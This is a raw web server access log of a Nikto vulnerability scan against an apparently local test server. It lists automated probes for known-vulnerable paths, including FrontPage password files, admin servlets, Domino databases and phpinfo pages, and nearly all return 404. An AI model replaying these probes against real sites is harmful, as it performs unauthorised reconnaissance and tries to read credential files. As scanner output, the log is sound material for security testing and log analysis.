172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_vti_bin/fpremadm.exe HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002851)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_vti_bin/fpsrvadm.exe HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002852)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_vti_bin/_vti_cnf/ HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002853)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_vti_cnf/_vti_cnf/ HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002854)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_vti_inf.html HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002855)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_vti_log/_vti_cnf/ HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002856)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_vti_pvt/administrators.pwd HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002857)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_vti_pvt/authors.pwd HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002858)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_vti_pvt/service.pwd HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002859)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_vti_pvt/users.pwd HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002860)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /manual/servlets/scripts/servlet1/servform.htm HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002861)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /manual/servlets/scripts/shoes/shoeform.htm HTTP/1.1" 404 532 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002862)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /examples/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002863)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /examples/context HTTP/1.1" 404 471 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002864)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /examples/forward1 HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002865)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /examples/forward2 HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002866)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /examples/header HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002867)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /examples/include1 HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002868)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /examples/info HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002869)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /examples/jsp/index.html HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002870)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /help/contents.htm HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002871)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /help/home.html HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002872)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /manual/ag/esperfrm.htm HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002873)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /nethome/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002874)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /com/novell/gwmonitor/help/en/default.htm HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002875)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /com/novell/webaccess/help/en/default.htm HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002876)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /com/novell/webpublisher/help/en/default.htm HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002877)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /servlet/AdminServlet HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002878)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /servlet/gwmonitor HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002879)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /servlet/PrintServlet HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002880)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /servlet/SearchServlet HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002881)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /servlet/ServletManager HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002882)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /servlet/sq1cdsn HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002883)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /servlet/sqlcdsn HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002884)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /servlet/webacc HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002885)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /servlet/webpub HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002886)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /WebSphereSamples HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002887)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/domguide.nsf HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002889)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/dspug.nsf HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002890)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/help4.nsf HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002891)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/helpadmin.nsf HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002892)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/helplt4.nsf HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002893)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/internet.nsf HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002894)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/javapg.nsf HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002895)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/lccon.nsf HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002896)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/migrate.nsf HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002897)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/npn_admn.nsf HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002898)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/npn_rn.nsf HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002899)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/readmec.nsf HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002900)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/readmes.nsf HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002901)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/smhelp.nsf HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002902)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/srvinst.nsf HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002903)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /domguide.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002904)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /dspug.nsf HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002905)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /help/domguide.nsf HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002906)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /help/dspug.nsf HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002907)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /help/help4.nsf HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002908)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /help/helpadmin.nsf HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002909)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /help/helplt4.nsf HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002910)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /help/internet.nsf HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002911)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /help/javapg.nsf HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002912)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /help/lccon.nsf HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002913)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /help/migrate.nsf HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002914)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /help/npn_admn.nsf HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002915)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /help/npn_rn.nsf HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002916)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /help/readmec.nsf HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002917)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /help/readmes.nsf HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002918)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /help/smhelp.nsf HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002919)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /help/srvinst.nsf HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002920)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /help4.nsf HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002921)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /helpadmin.nsf HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002922)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /helplt4.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002923)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /internet.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002924)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /javapg.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002925)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /lccon.nsf HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002926)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /migrate.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002927)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /npn_admn.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002928)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /npn_rn.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002929)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /readmec.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002930)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /readmes.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002931)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /smhelp.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002932)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /srvinst.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002933)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/misc/allfield.jse HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002934)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /lcgi/sys:/novonyx/suitespot/docs/sewse/misc/test.jse HTTP/1.1" 404 543 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002935)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /netbasic/websinfo.bas HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002936)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /perl/env.pl HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002937)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /perl/samples/env.pl HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002938)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /perl/samples/lancgi.pl HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002939)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /perl/samples/ndslogin.pl HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002940)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /perl/samples/volscgi.pl HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002941)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /se/?sys:/novonyx/suitespot/docs/sewse/misc/allfield.jse HTTP/1.1" 404 494 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002942)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.ca HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002943)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.cz.iso8859-2 HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002944)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.de HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002945)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.dk HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002946)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.ee HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002947)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.el HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002948)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.en HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002949)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.es HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002950)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.et HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002951)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.fr HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002952)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.he.iso8859-8 HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002953)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.hr.iso8859-2 HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002954)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.it HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002955)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.ja.iso2022-jp HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002956)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.kr.iso2022-kr HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002957)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.ltz.utf8 HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002958)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.lu.utf8 HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002959)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.nl HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002960)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.nn HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002961)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.no HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002962)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.po.iso8859-2 HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002963)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.pt HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002964)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.pt-br HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002965)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.ru.cp-1251 HTTP/1.1" 404 476 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002966)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.ru.cp866 HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002967)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.ru.iso-ru HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002968)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.ru.koi8-r HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002969)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.ru.utf8 HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002970)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.se HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002971)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.tw HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002972)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.tw.Big5 HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002973)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /index.html.var HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002974)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /test HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002975)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /iissamples/issamples/codebrws.asp HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002976)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /iissamples/issamples/ixqlang.htm HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002977)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /iissamples/issamples/Winmsdp.exe HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002978)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /iissamples/sdk/asp/docs/codebrw2.asp HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002979)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /iissamples/sdk/asp/docs/codebrws.asp HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002980)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /iissamples/sdk/asp/docs/Winmsdp.exe HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002981)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /mc-icons/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002982)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /ns-icons/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002983)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pls/simpledad/admin_/adddad.htm?%3CADVANCEDDAD%3E HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002988)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /test.php HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002989)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /test/info.php HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002990)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /info.php HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002991)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /test/phpinfo.php HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002992)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /NetDetector/middle_help_intro.htm HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002993)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /a/ HTTP/1.1" 404 493 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002994)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /basilix/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002995)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /bottom.html HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002996)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /interchange/ HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002997)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sca/menu.jsp HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002998)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "SEARCH / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002999)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /icons/ HTTP/1.1" 403 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003000)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /manual/images/ HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003001)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /com/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003002)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /COM/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003003)"
